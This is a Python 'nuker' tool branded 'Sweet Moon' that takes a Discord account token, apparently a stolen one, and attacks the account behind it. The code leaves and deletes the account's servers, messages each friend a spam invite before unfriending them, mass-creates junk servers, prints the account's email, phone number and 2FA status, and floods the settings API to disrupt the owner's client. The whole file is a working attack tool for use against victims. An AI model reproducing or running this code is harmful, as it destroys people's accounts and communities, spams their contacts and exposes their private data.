import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
import os
import colorama
from discord.ext import commands
from discord.ext.commands import Bot

import pyfiglet
from pyfiglet import Figlet

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
init(convert=True)
cls = lambda: os.system('cls')
cls()

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

token = input(
    "\n\n\033[34m>\x1b[1;38;5;56mToken\033[34m:\x1b[1;38;5;56m "
)
head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print('[Token Valid]')
else:
    print('[Invalid Token]')
    input("Press Any Key To Exit...")
    exit(0)





def nuke():
    print("LOADING...")
    print('\n')

    @bot.event
    async def on_ready(times: int = 100):

        print('STATUS : [NUKE]')
        print('\n')
        print('1 - LEAVING SERVERS')
        print('\n')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')
            except:
                print(f'CANT LEAVE [{guild.name}]')
        print('\n')
        print('2 - DELETING OWNED SERVERS')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}]HAS BEEN DELETED')
            except:
                print(f'CANT DELETE [{guild.name}]')

        print('\n')
        print('3 - REMOVING ALL FRIENDS')
        print('\n')

        for user in bot.user.friends:
            try:
                await user.dm_channel.send('discord.gg/6R98wtmvJe')
                await user.remove_friend()
                print(f'UNFRIENDED {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print('4 - SPAMMING SERVERS')
        print('\n')

        for i in range(times):
            await bot.create_guild('SM ON TOP', region=None, icon=None)
            print(f'{i} SERVER SPAMMED')
        print('\n')
        print('MAX SERVER LIMIT IS [100]')
        print('\n')
        print('\n')
        print('5 - CRASHING DISCORD')
        print('\n')

        print('\n')
        print("CRASHING THE TOKEN OWNER'S/USER'S DISCORD...")
        print(
            'IF YOU WANNA MAKE TOKEN OWNER/USER CRY THEN KEEP THIS EXE RUNING'
        )
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
            }
            requests.patch(
                "https://discord.com/api/v6/users/@me/settings",
                headers=headers,
                json=setting)

    bot.run(token, bot=False)


def unfriender():
    print("LOADING...")

    @bot.event
    async def on_ready():
        print('STATUS : [UNFRIENDER]')

        for user in bot.user.friends:
            try:
                embed=discord.Embed(title="SWEET MOON HERE", description="SWEET MOON HERE", color=0x0000ff) 
                embed.set_author(name="SWEET MOON HERE") 
                embed.set_footer(text="SWEET MOON HERE")
                embed.set_image(url="https://images-ext-1.discordapp.net/external/QWon2Y3AaKXh7DJOT_Layo65lyGNoj8Ox6wruo_xB_4/%3Fsize%3D4096/https/cdn.discordapp.com/icons/910793886690074634/36999ce18b0c29dfaa20414e43252ce4.png") 
                await user.dm_channel.send(embed=embed)
                await user.remove_friend()
                print(f'UNFRIENDED {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print(
            '[[UNFRIENDING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)



def leaver():
    print("LOADING...")
    

    @bot.event
    async def on_ready():
        print('STATUS : [SERVER LEAVER]')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'LEFT[{guild.name}]')
            except:
                print(f'CANT LEAVE [{guild.name}] BUT IT WILL BE DELETED...')

        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] HAS BEEN DELETED')
            except:
                print(f"CAN'T DELETE [{guild.name}]")

        print('\n')
        print('[[LEAVING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)



def spamservers():
    print("LOADING...")

    @bot.event
    async def on_ready(times: int = 95):
        print('STATUS : [SERVER SPAMMER]')

        for i in range(times):
            await bot.create_guild(
                'SWEET MOON HERE', region=None, icon=None)
            print(f'{i} SERVER CREATED')

        print('MAX SERVER LIMIT IS [100]')
        print('\n')
        print('[[SPAMMING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')
        input()

    bot.run(token, bot=False)


def tokenInfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
        input()


def crashdiscord(token):
    print('STATUS : [DISCORD CRASHER]')
    print('\n')
    print("CRASHING THE TOKEN OWNER'S/USER'S DISCORD...")
    print("IF YOU WANNA KEEP CRASHING OWNER'S/USER'S DISCORD THEN KEEP THIS EXE RUNING")
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
        }
        requests.patch(
            "https://discord.com/api/v6/users/@me/settings",
            headers=headers,
            json=setting)


def mainanswer():
  
    answer = input("""\x1b[1;38;5;56m
		

░██████╗░██╗░░░░░░░██╗███████╗███████╗████████╗  ███╗░░░███╗░█████╗░░█████╗░███╗░░██╗
██╔════╝░██║░░██╗░░██║██╔════╝██╔════╝╚══██╔══╝  ████╗░████║██╔══██╗██╔══██╗████╗░██║
╚█████╗░░╚██╗████╗██╔╝█████╗░░█████╗░░░░░██║░░░  ██╔████╔██║██║░░██║██║░░██║██╔██╗██║
░╚═══██╗░░████╔═████║░██╔══╝░░██╔══╝░░░░░██║░░░  ██║╚██╔╝██║██║░░██║██║░░██║██║╚████║
██████╔╝░░╚██╔╝░╚██╔╝░███████╗███████╗░░░██║░░░  ██║░╚═╝░██║╚█████╔╝╚█████╔╝██║░╚███║
╚═════╝░░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░░░╚═╝░░░  ╚═╝░░░░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚══╝\033[34mV1 
  \n\n\x1b[1;38;5;56m-BY \33[31mSW\033[1;90mEE\33[32mT MOON\x1b[1;38;5;56 \33[31m\033[1;90m\33[32m\x1b[1;38;5;56m\n\n-DISCORD = discord.gg/6R98wtmvJe
      
╔════════════════════╗       ╔════════════════════╗       ╔════════════════════╗      
║ 1] NUKE            ║       ║ 2] UNFRIEND ALL    ║       ║ 3] LEAVE SERVER'S  ║
╚════════════════════╝       ╚════════════════════╝       ╚════════════════════╝
╔════════════════════╗       ╔════════════════════╗       ╔════════════════════╗      
║ 4] SPAM SERVER'S   ║       ║ 5] INFO            ║       ║ 6] CRASHING        ║
╚════════════════════╝       ╚════════════════════╝       ╚════════════════════╝
\n\033[34mENTER YOUR CHOICE\x1b[1;38;5;56m:\x1b[1;38;5;56m """)
    if answer == '1':
        nuke()
    elif answer == '2':
        unfriender()
    elif answer == '3':
        leaver()
    elif answer == '4':
        spamservers()
    elif answer == '5':
        tokenInfo(token)
    elif answer == '6':
        crashdiscord(token)
    else:
        print('Incorrect selection, please choose a number')
        mainanswer()


mainanswer()
